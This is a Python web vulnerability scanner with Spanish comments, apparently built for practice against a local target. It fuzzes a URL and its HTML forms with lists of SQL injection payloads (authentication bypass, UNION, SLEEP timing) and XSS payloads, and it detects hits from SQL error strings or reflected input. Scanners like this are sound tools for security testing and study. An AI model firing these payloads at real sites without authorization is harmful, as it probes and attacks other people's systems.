import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re


def iniciar_escaneo_completo(url):
    resultados = []
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'}

    print(f"\n[+] Iniciando escaneo avanzado (Fuzzing) en: {url}")

    # --- 1. DICCIONARIOS DE PAYLOADS (FUZZING) ---
    # Diferentes formas de romper una base de datos
    payloads_sqli = [
        "'",                  # Rompe sintaxis básica
        "admin'",             # Rompe sintaxis de usuarios
        "' OR '1'='1",        # Bypass clásico de autenticación
        "' OR 1=1--",         # Bypass con comentario SQL
        "\" OR \"1\"=\"1",    # Bypass con comillas dobles
        "1' ORDER BY 1--",    # Detección de columnas
        "' UNION SELECT NULL--",
        "' AND SLEEP(5)--"
    ]

    # Diferentes formas de inyectar JavaScript
    payloads_xss = [
        "<script>alert('XSS')</script>",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "\"><script>alert('XSS')</script>",
        "'\"><script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "<iframe src=\"javascript:alert('XSS')\">",
        "<input onfocus=alert('XSS') autofocus>"
    ]

    # Ampliamos los errores que detectamos (incluyendo Oracle y PostgreSQL)
    errores_sql = ["mysql", "syntax", "error in your sql",
                   "warning:", "exception", "java.sql", "ora-", "postgresql",
                   "unclosed quotation", "odbc", "sqlite", "microsoft", "ole db"]

    # --- PRUEBA 1: SQL Injection Avanzado (GET) ---
    print("[*] Ejecutando Fuzzing de SQLi por URL...")
    for payload in payloads_sqli:
        url_sqli = url + payload
        try:
            res = requests.get(url_sqli, headers=headers, timeout=20)
            contenido = res.text.lower()
            
            if any(error in contenido for error in errores_sql):
                print(f">>> 🔴 ¡SQLi detectado con el payload: {payload}")
                resultados.append({
                    "tipo": f"SQL Injection", 
                    "severidad": "Alta",
                    "descripcion": f"Error SQL detectado con payload: {payload}"
                })
                break
        except Exception as e:
            print(f"[-] Error SQLi: {e}")
            pass

    # --- PRUEBA 2: XSS Avanzado (GET) ---
    print("[*] Ejecutando Fuzzing de XSS por URL...")
    
    for payload in payloads_xss:
        url_xss = url + payload
        try:
            res = requests.get(url_xss, headers=headers, timeout=20)
            contenido = res.text
            contenido_lower = contenido.lower()
            
            # MÉTODO 1: Buscar payload exacto (funciona en victima.py)
            if payload in contenido:
                print(f">>> 🟡 ¡XSS detectado con payload exacto!")
                resultados.append({
                    "tipo": "XSS Reflejado", 
                    "severidad": "Media",
                    "descripcion": f"Payload reflejado exactamente"
                })
                break
                
            # MÉTODO 2: Buscar patrones comunes de XSS
            patrones_xss = [
                "<script>alert", "<script>prompt", "<script>confirm",
                "onerror=alert", "onload=alert", "onfocus=alert",
                "javascript:alert", "alert('xss')", "alert(\"xss\")"
            ]
            
            if any(patron in contenido_lower for patron in patrones_xss):
                print(f">>> 🟡 ¡Posible XSS detectado por patrón!")
                resultados.append({
                    "tipo": "XSS Reflejado", 
                    "severidad": "Media",
                    "descripcion": f"Patrón XSS detectado"
                })
                break
                
            # MÉTODO 3: Buscar funciones JavaScript comunes
            funciones_js = ["alert(", "prompt(", "confirm("]
            if any(func in contenido_lower for func in funciones_js):
                print(f">>> 🟡 ¡Posible XSS detectado por función JS!")
                resultados.append({
                    "tipo": "XSS Reflejado", 
                    "severidad": "Media",
                    "descripcion": f"Función JavaScript detectada"
                })
                break
                
        except Exception as e:
            print(f"[-] Error XSS: {e}")
            continue

    # --- PRUEBA 3: ESCANEO DE FORMULARIOS AVANZADO (POST) ---
    print("[*] Buscando y atacando formularios con Fuzzing...")
    try:
        res = requests.get(url, headers=headers, timeout=20)
        soup = BeautifulSoup(res.text, "html.parser")
        formularios = soup.find_all("form")

        if formularios:
            for form in formularios:
                action = form.get("action")
                target_url = urljoin(url, action) if action else url
                inputs = form.find_all("input")

                vulnerabilidad_encontrada = False

                # Probamos SQLi en formularios
                for payload in payloads_sqli:
                    datos_falsos = {}
                    for inp in inputs:
                        nombre = inp.get("name")
                        if nombre:
                            datos_falsos[nombre] = payload

                    try:
                        res_post = requests.post(
                            target_url, data=datos_falsos, headers=headers, timeout=20)
                        
                        if any(error in res_post.text.lower() for error in errores_sql):
                            print(
                                f">>> 🔴 ¡SQLi en Formulario detectado con: {payload}")
                            resultados.append({
                                "tipo": "SQL Injection en Formulario", 
                                "severidad": "Alta",
                                "descripcion": f"SQLi en POST con payload: {payload}"
                            })
                            vulnerabilidad_encontrada = True
                            break
                    except:
                        pass

                if vulnerabilidad_encontrada:
                    break
                    
                # Probamos XSS en formularios
                for payload in payloads_xss[:3]:  # Solo probar algunos
                    datos_falsos = {}
                    for inp in inputs:
                        nombre = inp.get("name")
                        if nombre:
                            datos_falsos[nombre] = payload

                    try:
                        res_post = requests.post(
                            target_url, data=datos_falsos, headers=headers, timeout=20)
                        
                        if payload in res_post.text:
                            print(f">>> 🟡 ¡XSS en Formulario detectado!")
                            resultados.append({
                                "tipo": "XSS en Formulario", 
                                "severidad": "Media",
                                "descripcion": f"XSS en POST detectado"
                            })
                            vulnerabilidad_encontrada = True
                            break
                    except:
                        pass

                if vulnerabilidad_encontrada:
                    break
        else:
            print("[*] No hay formularios en esta página.")
    except Exception as e:
        print(f"[-] Error al analizar formularios: {e}")

    # --- RESULTADO FINAL ---
    if not resultados:
        print("[!] Fin del escaneo: Ninguna detectada.")
        resultados.append({"tipo": "Ninguna detectada", "severidad": "Baja"})

    return resultados